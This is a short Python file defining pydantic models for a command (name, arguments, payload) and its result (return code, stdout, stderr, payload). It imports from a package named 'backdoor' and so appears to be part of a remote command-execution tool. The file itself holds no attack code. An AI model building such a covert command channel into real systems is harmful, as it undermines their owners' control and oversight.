from typing import Optional

from pydantic import BaseModel

from backdoor.models.mixins import PayloadSerializerMixin


class Command(BaseModel, PayloadSerializerMixin):
    command: str
    args: Optional[list[str]] = None
    payload: Optional[bytes] = None


class CommandResult(BaseModel, PayloadSerializerMixin):
    success: bool
    returncode: int
    stdout: Optional[str] = None
    stderr: Optional[str] = None
    payload: Optional[bytes] = None
